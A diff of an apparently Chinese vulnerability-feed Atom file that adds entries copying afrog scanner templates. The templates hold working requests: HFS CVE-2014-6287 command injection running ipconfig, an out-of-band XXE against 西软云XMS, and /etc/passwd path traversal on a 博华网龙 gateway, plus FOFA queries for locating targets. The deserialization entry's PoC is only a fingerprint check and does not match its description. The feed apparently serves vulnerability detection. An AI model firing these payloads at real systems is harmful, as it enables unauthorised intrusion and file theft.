@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-07-05T10:01:27.759Z</updated>
+  <updated>2025-07-05T10:16:05.872Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,114 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>HFS 23h 命令执行漏洞</title>
+    <link href="http://example.com/2025/07/05/github_1454545131/"/>
+    <id>http://example.com/2025/07/05/github_1454545131/</id>
+    <published>2025-07-05T10:16:05.000Z</published>
+    <updated>2025-07-05T10:16:05.872Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> HFS 2.3h 命令执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2014-6287</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> HttpFileServer (HFS) 是一款轻量级的HTTP文件服务器软件，广泛用于Windows平台上快速共享文件。它支持通过网页界面进行文件的上传和下载，操作简便，因此在个人和小型企业中较为流行。然而，HFS 2.3h版本存在一个严重的命令执行漏洞，攻击者可以通过构造特定的search参数，远程执行任意系统命令。这一漏洞的技术根源在于HFS对用户输入的search参数未进行充分的过滤和验证，导致攻击者能够注入并执行恶意命令。由于HFS通常以较高权限运行，成功利用此漏洞的攻击者可以完全控制受影响的系统，执行任意命令，可能导致数据泄露、服务中断或其他恶意活动。此漏洞的利用无需认证，且可以远程自动化执行，因此危害性极高。</p><p><strong>产品名称：</strong> HttpFileServer (HFS)</p><p><strong>影响版本：</strong> 2.3h</p><p><strong>来源：</strong> <a href="https://github.com/zan8in/afrog/blob/1823fa1eef54086d619bb8b99776a26190f6a3c1/pocs%2Fafrog-pocs%2Ffingerprinting%2Fhfs-rce-cmd-exec.yaml">https://github.com/zan8in/afrog/blob/1823fa1eef54086d619bb8b99776a26190f6a3c1/pocs%2Fafrog-pocs%2Ffingerprinting%2Fhfs-rce-cmd-exec.yaml</a></p><p><strong>类型：</strong> zan8in&#x2F;afrog:github commit</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol"></span><br><span class="hljs-symbol">id:</span> hfs-rce-cmd-exec<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">info:</span><br><span class="hljs-symbol">  name:</span> HFS <span class="hljs-number">2.3</span>h 命令执行漏洞检测<br><span class="hljs-symbol">  author:</span> chatgpt<br><span class="hljs-symbol">  severity:</span> critical<br><span class="hljs-symbol">  description:</span> |<br>    检测 HttpFileServer (HFS) v2<span class="hljs-number">.3</span>h 存在命令执行漏洞，允许远程攻击者通过构造特定 search 参数执行系统命令。<br><span class="hljs-symbol">  reference:</span><br>    - https:<span class="hljs-comment">//www.exploit-db.com/exploits/34668</span><br>    - https:<span class="hljs-comment">//nvd.nist.gov/vuln/detail/CVE-2014-6287</span><br><span class="hljs-symbol">  tags:</span> rce,hfs,cve,cve2014,windows<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">rules:</span><br><span class="hljs-symbol">  r0:</span><br><span class="hljs-symbol">    request:</span><br><span class="hljs-symbol">      method:</span> GET<br><span class="hljs-symbol">      path:</span> <span class="hljs-string">&quot;/?search=%25xxx%25url%25:%password%&#125;&#123;.exec|ipconfig|timeout=5|out=abc.&#125;RESULT:&#123;.^abc.&#125;&quot;</span><br><span class="hljs-symbol">    expression:</span> response.<span class="hljs-attr">status</span> <span class="hljs-operator">=</span>= <span class="hljs-number">200</span> &amp;&amp; response.body.bcontains(b<span class="hljs-string">&quot;Windows IP&quot;</span>)<br><span class="hljs-symbol">expression:</span> r0()<br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; HFS 2.3h 命令执行漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/s</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+    <category term="zan8in/afrog:github commit" scheme="http://example.com/tags/zan8in-afrog-github-commit/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>西软云XMS-futurehotel-operate XXE漏洞</title>
+    <link href="http://example.com/2025/07/05/github_691438908/"/>
+    <id>http://example.com/2025/07/05/github_691438908/</id>
+    <published>2025-07-05T10:15:52.000Z</published>
+    <updated>2025-07-05T10:15:52.019Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> 西软云XMS-futurehotel-operate XXE漏洞</p><p><strong>漏洞类型：</strong> XML实体注入</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> 西软云XMS是一款面向酒店行业的云管理系统，提供包括前台接待、客房管理、财务管理等功能，广泛应用于各类酒店及住宿服务场所。该系统通过云服务模式部署，便于酒店管理方进行远程操作和数据管理。本次发现的漏洞位于futurehotel-operate接口，该接口负责处理酒店未来订单的相关操作。</p><p>该漏洞属于XML外部实体注入（XXE）类型，攻击者可以通过构造恶意的XML请求，利用系统对XML输入的不当处理，读取服务器上的任意文件。具体来说，系统在处理用户提交的XML数据时，未对XML中的外部实体引用进行限制，导致攻击者可以通过定义恶意的外部实体，访问系统内部资源或敏感文件。</p><p>此漏洞的利用可能导致严重的安全风险，包括但不限于敏感数据泄露、系统配置信息暴露等。由于攻击者可以通过网络远程发起攻击，且无需任何形式的身份验证，因此该漏洞的威胁等级被评定为“严重”。攻击者可以利用此漏洞自动化地获取服务器上的敏感信息，对受影响的企业造成重大的经济损失和声誉损害。</p><p><strong>产品厂商：</strong> 西软云</p><p><strong>产品名称：</strong> 西软云XMS</p><p><strong>搜索语法：</strong> app&#x3D;”shiji-西软云XMS”</p><p><strong>来源：</strong> <a href="https://github.com/zan8in/afrog/blob/1823fa1eef54086d619bb8b99776a26190f6a3c1/pocs%2Fafrog-pocs%2Fvulnerability%2Fxiruanyun-xms-futurehotel-operate-xxe.yaml">https://github.com/zan8in/afrog/blob/1823fa1eef54086d619bb8b99776a26190f6a3c1/pocs%2Fafrog-pocs%2Fvulnerability%2Fxiruanyun-xms-futurehotel-operate-xxe.yaml</a></p><p><strong>类型：</strong> zan8in&#x2F;afrog:github commit</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> xiruanyun-xms-futurehotel-operate-xxe<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> 西软云XMS-futurehotel-operate 接口存在XXE漏洞<br>  <span class="hljs-params">author:</span> zan8in<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |-<br>    <span class="hljs-params">fofa:</span> app<span class="hljs-operator">=</span><span class="hljs-string">&quot;shiji-西软云XMS&quot;</span><br>    西软云XMS futurehotel-operate 接口存在XXE漏洞，攻击者可利用该漏洞读取任意文件。<br>  <span class="hljs-params">tags:</span> xiranyun,xxe,shiji<br>  <span class="hljs-params">created:</span> <span class="hljs-number">2025</span><span class="hljs-symbol">/07/03</span><br><br><span class="hljs-params">set:</span><br>  <span class="hljs-params">oob:</span> oob()<br>  <span class="hljs-params">oobHTTP:</span> oob.HTTP<br><span class="hljs-params">rules:</span><br>  <span class="hljs-params">r0:</span><br>    <span class="hljs-params">request:</span><br>      <span class="hljs-params">method:</span> POST<br>      <span class="hljs-params">path:</span> <span class="hljs-symbol">/XopServerRS/rest/futurehotel/operate</span><br>      <span class="hljs-params">headers:</span><br>        <span class="hljs-params">Content-Type:</span> text<span class="hljs-symbol">/xml</span><br>      <span class="hljs-params">body:</span> |<br>        <span class="hljs-operator">&lt;</span><span class="hljs-operator">!</span>DOCTYPE root [ <span class="hljs-operator">&lt;</span><span class="hljs-operator">!</span>ENTITY % remote SYSTEM <span class="hljs-string">&quot;&#123;&#123;oobHTTP&#125;&#125;&quot;</span><span class="hljs-operator">&gt;</span> %remote;]<span class="hljs-operator">&gt;</span><br>    <span class="hljs-params">expression:</span> oobCheck(oob, oob.ProtocolHTTP, <span class="hljs-number">3</span>)<br><span class="hljs-params">expression:</span> r0()<br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; 西软云XMS-futurehotel-operate XXE漏洞&lt;/p&gt;
+&lt;p</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="zan8in/afrog:github commit" scheme="http://example.com/tags/zan8in-afrog-github-commit/"/>
+    
+    <category term="XML实体注入" scheme="http://example.com/tags/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>中科博华网龙网关 arp_scanphp 任意文件读取漏洞</title>
+    <link href="http://example.com/2025/07/05/github_2701402399/"/>
+    <id>http://example.com/2025/07/05/github_2701402399/</id>
+    <published>2025-07-05T10:15:35.000Z</published>
+    <updated>2025-07-05T10:15:35.443Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> 中科博华网龙网关 arp_scan.php 任意文件读取漏洞</p><p><strong>漏洞类型：</strong> 文件读取</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 中科博华网龙网关是一款企业级网络安全产品，主要用于网络边界的安全防护，包括防火墙、入侵检测等功能，广泛应用于各类企事业单位的网络环境中。该产品在安全防护方面扮演着重要角色，因此其安全性直接关系到企业网络的安全。此次发现的漏洞存在于arp_scan.php文件中，该文件未对用户输入进行严格过滤，导致攻击者可以通过构造特定的请求路径，实现任意文件读取。这种漏洞的根源在于缺乏对用户输入的有效验证和过滤，使得攻击者能够利用目录遍历技术访问系统敏感文件。攻击者利用此漏洞可以读取系统重要文件，如数据库配置文件、系统配置文件等，这些文件往往包含敏感信息，如数据库连接凭证、系统配置细节等。一旦这些信息被泄露，攻击者可以进一步利用这些信息进行更深层次的攻击，如数据库入侵、系统控制等。由于该漏洞无需身份验证即可利用，且攻击过程可以自动化进行，因此对受影响系统的安全构成了严重威胁。</p><p><strong>产品厂商：</strong> 中科博华网龙</p><p><strong>产品名称：</strong> 中科博华网龙网关</p><p><strong>搜索语法：</strong> title&#x3D;”博华网龙”</p><p><strong>来源：</strong> <a href="https://github.com/zan8in/afrog/blob/1823fa1eef54086d619bb8b99776a26190f6a3c1/pocs%2Fafrog-pocs%2Fvulnerability%2Fbohuawanglong-arp-scan-fileread.yaml">https://github.com/zan8in/afrog/blob/1823fa1eef54086d619bb8b99776a26190f6a3c1/pocs%2Fafrog-pocs%2Fvulnerability%2Fbohuawanglong-arp-scan-fileread.yaml</a></p><p><strong>类型：</strong> zan8in&#x2F;afrog:github commit</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> bohuawanglong-arp-scan-fileread<br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> 中科博华网龙网关 arp_scan.php 任意文件读取漏洞<br>  <span class="hljs-params">author:</span> Superhero<br>  <span class="hljs-params">severity:</span> high<br>  <span class="hljs-params">description:</span> |-<br>    <span class="hljs-params">fofa:</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;博华网龙&quot;</span><br>    中科博华网龙网关 arp_scan.php 任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//mp.weixin.qq.com/s/1GaVAZLcHXVRLUPCdPnBVw</span><br>  <span class="hljs-params">tags:</span> bohuawanglong,fileread<br><br><span class="hljs-params">rules:</span><br>  <span class="hljs-params">r0:</span><br>    <span class="hljs-params">request:</span><br>      <span class="hljs-params">method:</span> GET<br>      <span class="hljs-params">path:</span> <span class="hljs-operator">/</span>firewall<span class="hljs-operator">/</span>arp_scan.php<span class="hljs-operator">?</span>ifname<span class="hljs-operator">=</span><span class="hljs-symbol">/../../../../../etc/passwd</span><br>    <span class="hljs-params">expression:</span> response.status <span class="hljs-operator">==</span> <span class="hljs-number">200</span> <span class="hljs-operator">&amp;&amp;</span> response.body.bcontains(b&#x27;sshd:x&#x27;) <span class="hljs-operator">&amp;&amp;</span> response.body.bcontains(b&#x27;<span class="hljs-operator">/</span>sbin<span class="hljs-operator">/</span>nologin&#x27;)<br><span class="hljs-params">expression:</span> r0()<br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; 中科博华网龙网关 arp_scan.php 任意文件读取漏洞&lt;/p&gt;
+&lt;p&gt;&lt;</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="文件读取" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
+    
+    <category term="zan8in/afrog:github commit" scheme="http://example.com/tags/zan8in-afrog-github-commit/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>西软云XMS 反序列化漏洞</title>
+    <link href="http://example.com/2025/07/05/github_2384591449/"/>
+    <id>http://example.com/2025/07/05/github_2384591449/</id>
+    <published>2025-07-05T10:15:19.000Z</published>
+    <updated>2025-07-05T10:15:19.743Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> 西软云XMS 反序列化漏洞</p><p><strong>漏洞类型：</strong> 反序列化</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 西软云XMS是一款可能用于企业级服务的软件，具体功能未在提供的信息中详细说明，但从其命名和部署的接口来看，它可能是一个内容管理系统或类似的企业级应用。该产品通过Web接口提供服务，且根据描述，它在企业中有一定的应用范围。</p><p>该漏洞存在于西软云XMS的&#x2F;fox-invoker&#x2F;FoxLookupInvoker接口处，属于反序列化漏洞类型。反序列化漏洞通常由于应用程序在处理序列化对象时未进行充分的验证或过滤，导致攻击者可以构造恶意的序列化数据，进而在目标系统上执行任意代码。此漏洞的特别之处在于，攻击者无需进行身份认证即可利用，这大大增加了漏洞的危险性和利用的便捷性。</p><p>利用此漏洞，攻击者可以远程执行任意代码，完全控制受影响的服务器，导致数据泄露、服务中断等严重后果。由于漏洞利用不需要认证，攻击者可以自动化地进行大规模扫描和攻击，对部署了西软云XMS的系统构成严重威胁。因此，该漏洞被评定为高危级别，建议相关用户尽快采取修补措施。</p><p><strong>产品厂商：</strong> 西软云</p><p><strong>产品名称：</strong> 西软云XMS</p><p><strong>搜索语法：</strong> app&#x3D;”shiji-西软云XMS”</p><p><strong>来源：</strong> <a href="https://github.com/zan8in/afrog/blob/1823fa1eef54086d619bb8b99776a26190f6a3c1/pocs%2Fafrog-pocs%2Ffingerprinting%2Fxiruanyun-xms-detect.yaml">https://github.com/zan8in/afrog/blob/1823fa1eef54086d619bb8b99776a26190f6a3c1/pocs%2Fafrog-pocs%2Ffingerprinting%2Fxiruanyun-xms-detect.yaml</a></p><p><strong>类型：</strong> zan8in&#x2F;afrog:github commit</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> xiruanyun-xms-detect<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> 西软云XMS<br>  <span class="hljs-params">author:</span> zan8in<br>  <span class="hljs-params">severity:</span> info<br>  <span class="hljs-params">description:</span> |-<br>    <span class="hljs-params">fofa:</span> app<span class="hljs-operator">=</span><span class="hljs-string">&quot;shiji-西软云XMS&quot;</span><br>    西软云XMS <span class="hljs-operator">/</span>fox-invoker<span class="hljs-operator">/</span>FoxLookupInvoker接口处存在反序列化漏洞，未经身份认证的攻击者可利用此漏洞执行任意代码，获取服务器权限。<br>  <span class="hljs-params">tags:</span> xiranyun,xxe,shiji<br>  <span class="hljs-params">created:</span> <span class="hljs-number">2025</span><span class="hljs-symbol">/07/03</span><br><br><span class="hljs-params">rules:</span><br>  <span class="hljs-params">r0:</span><br>    <span class="hljs-params">request:</span><br>      <span class="hljs-params">method:</span> GET<br>      <span class="hljs-params">path:</span> <span class="hljs-symbol">/WebXMS</span><br>      <span class="hljs-params">follow_redirects:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">expression:</span> response.status <span class="hljs-operator">==</span> <span class="hljs-number">200</span> <span class="hljs-operator">&amp;&amp;</span> response.body.ibcontains(b&#x27;<span class="hljs-symbol">&lt;title&gt;</span>西软云XMS<span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>title<span class="hljs-operator">&gt;</span>&#x27;)<br><span class="hljs-params">expression:</span> r0()<br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; 西软云XMS 反序列化漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞类型：&lt;/str</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
+    
+    <category term="zan8in/afrog:github commit" scheme="http://example.com/tags/zan8in-afrog-github-commit/"/>
+    
+  </entry>
   
   <entry>
     <title>frameandsurface Twitter Update !</title>
@@ -416,108 +524,6 @@
     
     
     <category term="CVEShield" scheme="http://example.com/tags/CVEShield/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>vixxxkigoli Twitter Update !</title>
-    <link href="http://example.com/2025/07/05/twitter_3226333107/"/>
-    <id>http://example.com/2025/07/05/twitter_3226333107/</id>
-    <published>2025-07-05T09:00:34.000Z</published>
-    <updated>2025-07-05T09:00:34.634Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> vixxxkigoli</p><p><strong>推文：</strong> 🚨 Debian用户请注意！<br>在Debian中发现了一个新的严重漏洞CVE-2025-32463。<br>请运行：sudo apt update &amp;&amp; sudo apt upgrade<br>👉 尽快更新以确保安全！<br>#Debian #Linux #网络安全 #立即更新</p><p><strong>链接：</strong> <a href="https://x.com/vixxxkigoli/status/1941418036185137272">https://x.com/vixxxkigoli/status/1941418036185137272</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; vixxxkigoli&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 🚨 Debian用户请注意！&lt;br&gt;在Debian中发现了一个新的严重漏洞CVE-2025-32463。&lt;br&gt;请运行：sudo apt update</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="vixxxkigoli" scheme="http://example.com/tags/vixxxkigoli/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>alpha11890 Twitter Update !</title>
-    <link href="http://example.com/2025/07/05/twitter_2640200742/"/>
-    <id>http://example.com/2025/07/05/twitter_2640200742/</id>
-    <published>2025-07-05T09:00:28.000Z</published>
-    <updated>2025-07-05T09:00:28.514Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> alpha11890</p><p><strong>推文：</strong> CALDERA刚刚投下了一颗网络炸弹</p><p>✦ 全新图形用户界面，操作更流畅，流程更清晰<br>✦ AI和OT技术即将上线，未来是自动化的<br>✦ CVE‑2025‑27364（CVSS 10.0）是一个可能摧毁你系统的严重远程代码执行漏洞<br>✦ 现已推出补丁，版本v5.1.0+<br>✦ 新增52个针对ICS的战术、技术和程序（TTPs）（你好，Profinet + IEC 61850）<br>✦ 新增对手档案和引导式规划器</p><p>@Calderaxyz 不仅幸存下来，还升级了</p><p>周末愉快，传奇们</p><p><strong>链接：</strong> <a href="https://x.com/alpha11890/status/1941418735220252910">https://x.com/alpha11890/status/1941418735220252910</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; alpha11890&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; CALDERA刚刚投下了一颗网络炸弹&lt;/p&gt;
-&lt;p&gt;✦ 全新图形用户界面，操作更流畅，流程更清晰&lt;br&gt;✦ AI和OT技术即将上线，未来是自动化的&lt;br&gt;</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="alpha11890" scheme="http://example.com/tags/alpha11890/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>pdnuclei_bot Twitter Update !</title>
-    <link href="http://example.com/2025/07/05/twitter_2575157742/"/>
-    <id>http://example.com/2025/07/05/twitter_2575157742/</id>
-    <published>2025-07-05T09:00:18.000Z</published>
-    <updated>2025-07-05T09:00:18.765Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> pdnuclei_bot</p><p><strong>推文：</strong> 🚨 紧急警报：CVE-2025-5777 - 严重漏洞 🚨</p><p>Citrix NetScaler 内存泄露 - CitrixBleed 2</p><p>&gt; NetScaler 管理界面因输入验证不足导致内存过度读取…</p><p>👾 详情点击：<a href="https://t.co/ZB3zC5PNYa">https://t.co/ZB3zC5PNYa</a></p><p>@pdnuclei #Nuclei模板 #漏洞公告</p><p><strong>链接：</strong> <a href="https://x.com/pdnuclei_bot/status/1941421808554738058">https://x.com/pdnuclei_bot/status/1941421808554738058</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; pdnuclei_bot&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 🚨 紧急警报：CVE-2025-5777 - 严重漏洞 🚨&lt;/p&gt;
-&lt;p&gt;Citrix NetScaler 内存泄露 - CitrixBleed </summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="pdnuclei_bot" scheme="http://example.com/tags/pdnuclei-bot/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>How Much More Must We Bleed? - Citrix NetScaler Memory Disclosure (CitrixBleed 2 CVE-2025-5777)</title>
-    <link href="http://example.com/2025/07/05/blog_1680224638/"/>
-    <id>http://example.com/2025/07/05/blog_1680224638/</id>
-    <published>2025-07-05T08:30:06.000Z</published>
-    <updated>2025-07-05T08:30:06.151Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>描述：</strong> Before you dive into our latest diatribe, indulge us and join us on a journey.</p><p>Sit in your chair, stand at your desk, lick your phone screen - close your eyes and imagine a world in which things are great. It’s sunny outside, the birds are chirping, and your</p><p><strong>链接：</strong> <a href="https://labs.watchtowr.com/how-much-more-must-we-bleed-citrix-netscaler-memory-disclosure-citrixbleed-2-cve-2025-5777/">https://labs.watchtowr.com/how-much-more-must-we-bleed-citrix-netscaler-memory-disclosure-citrixbleed-2-cve-2025-5777/</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;描述：&lt;/strong&gt; Before you dive into our latest diatribe, indulge us and join us on a journey.&lt;/p&gt;
-&lt;p&gt;Sit in your chair, stand at yo</summary>
-      
-    
-    
-    
-    <category term="安全博客" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%8D%9A%E5%AE%A2/"/>
-    
-    
-    <category term="labs.watchtowr.com" scheme="http://example.com/tags/labs-watchtowr-com/"/>
     
   </entry>
   
